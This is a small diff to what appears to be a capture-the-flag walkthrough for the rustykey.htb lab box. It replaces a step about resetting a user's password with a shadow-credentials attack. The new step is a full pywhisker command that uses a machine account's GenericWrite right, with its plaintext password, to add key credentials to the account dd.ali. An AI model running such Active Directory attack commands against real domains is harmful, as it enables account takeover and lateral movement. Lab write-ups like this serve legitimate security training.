@@ -91,9 +91,9 @@
 
 ![image](https://github.com/user-attachments/assets/bc7eb631-1379-4863-89ff-9d9dc105ffdf)
 
-15. Now change bb.morgan's password, again, using bloodyAD
+15. Using IT-Computer3$, which has GenericWrite on dd.ali, do shadow credential attack using pywhisker script
 
-``
+`sudo python3 /opt/pywhisker/pywhisker/pywhisker.py --dc-ip dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k --target "dd.ali" --action "add"`
 
 
 
